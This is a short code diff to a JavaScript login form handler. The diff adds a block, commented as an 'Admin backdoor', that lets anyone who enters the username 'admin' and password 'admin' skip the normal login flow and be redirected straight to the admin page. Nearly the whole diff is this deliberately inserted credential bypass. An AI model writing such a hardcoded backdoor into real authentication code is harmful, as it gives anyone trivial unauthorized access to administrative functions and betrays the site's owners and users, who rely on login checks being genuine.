@@ -78,6 +78,12 @@
                 return;
             }
 
+            // Admin backdoor: access admin panel with admin/admin
+            if (identifier.toLowerCase() === 'admin' && password === 'admin') {
+                window.location.href = 'admin.html#profile';
+                return;
+            }
+
             submitBtn.disabled = true;
             submitBtn.classList.add('loading');
 
